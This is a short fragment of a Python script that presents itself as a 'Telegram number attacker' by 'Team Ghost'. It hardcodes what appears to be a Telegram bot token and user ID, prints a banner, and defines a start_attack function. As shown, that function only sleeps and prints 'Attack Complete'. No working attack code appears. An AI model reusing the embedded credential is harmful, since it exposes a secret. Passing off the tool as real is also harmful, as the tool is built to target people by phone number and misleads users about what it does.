...
#####
bot_token = '   6980619441:AAGzI5ad1Gy4TAGhWGzDmGEfom0YgeAD-q0'
telegram_user_id = '6407358744'
os.system('clear')
logo3 = f'''
{RED}
...
------------------------------------------------------   
~TELGRAM NUMBER -H4X- ATTACKER BY TEAM GHOST~
...
def start_attack(telegram_number):
    ...
    for _ in range(100):
        time.sleep(5)
        print(" 👻Attack Complete By Ghost 👻")
